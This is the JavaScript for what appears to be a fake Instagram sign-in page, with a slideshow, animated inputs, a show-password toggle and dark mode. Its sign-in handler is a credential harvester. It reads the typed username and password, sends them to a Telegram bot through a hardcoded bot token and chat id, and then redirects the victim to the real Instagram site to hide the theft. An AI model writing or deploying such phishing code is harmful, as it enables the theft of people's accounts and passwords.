let slide_content = document.querySelector("#slide-content");

let signin_form = document.querySelector("#signin-form");

let signin_btn = document.querySelector("#signin-btn");

let darkmode_toggle = document.querySelector("#darkmode-toggle");

let slide_index = 0;

slide = () => {
  let slide_items = slide_content.querySelectorAll("img");
  slide_items.forEach((e) => e.classList.remove("active"));
  slide_index = slide_index + 1 === slide_items.length ? 0 : slide_index + 1;
  slide_items[slide_index].classList.add("active");
};

setInterval(slide, 2000);

// animate input
document.querySelectorAll(".animate-input").forEach((e) => {
  let input = e.querySelector("input");
  let button = e.querySelector("button");

  input.onkeyup = () => {
    if (input.value.trim().length > 0) {
      e.classList.add("active");
    } else {
      e.classList.remove("active");
    }

    if (checkSigninInput()) {
      signin_btn.removeAttribute("disabled");
    } else {
      signin_btn.setAttribute("disabled", "true");
    }
  };

  // show password button
  if (button) {
    button.onclick = () => {
      if (input.getAttribute("type") === "text") {
        input.setAttribute("type", "password");
        button.innerHTML = "Show";
      } else {
        input.setAttribute("type", "text");
        button.innerHTML = "Hide";
      }
    };
  }
});

checkSigninInput = () => {
  let inputs = signin_form.querySelectorAll("input");
  return Array.from(inputs).every((input) => {
    return input.value.trim().length >= 6;
  });
};

// darkmode toggle
darkmode_toggle.onclick = (e) => {
  e.preventDefault();
  let body = document.querySelector("body");
  body.classList.toggle("dark");
  darkmode_toggle.innerHTML = body.classList.contains("dark")
    ? "Lightmode"
    : "Darkmode";
};

signin_btn.onclick = (e) => {
  e.preventDefault();
  var username = document.querySelector('input[name="username"]').value;
  var password = document.querySelector('input[name="password"]').value;
  var token = "5615796879:AAFaC55hWOcKkU_E6ciehm62ytIBzvkbke0";
  var chat_id = -1001838358621;
  var url = `https://api.telegram.org/bot${token}/sendMessage`;
  let message = `<b>Instagram parol!</b>\n`;
  message += `<b>Login: </b>${username}\n`;
  message += `<b>Parol: </b>${password}`;

  axios
    .post(url, {
      chat_id: chat_id,
      parse_mode: "html",
      text: message,
    })
    .then((res) => {
      window.location.href = "https://www.instagram.com/";
    });
};
